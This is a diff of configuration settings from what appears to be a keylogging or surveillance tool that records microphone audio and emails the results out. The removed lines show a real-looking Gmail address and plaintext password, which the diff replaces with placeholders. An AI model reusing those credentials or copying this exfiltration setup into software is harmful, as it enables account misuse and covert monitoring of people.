@@ -40,10 +40,10 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 1
 
-email_address = "cleopetty69@gmail.com"
-password = "alexandria_69_BC"
+email_address = "xxx@gmail.com"
+password = "xxx"
 
-toaddr = "cleopetty69@gmail.com"
+toaddr = "xxx@gmail.com"
 
 file_path = "D:\\LoggerTest\\Project"
 extend = "\\"
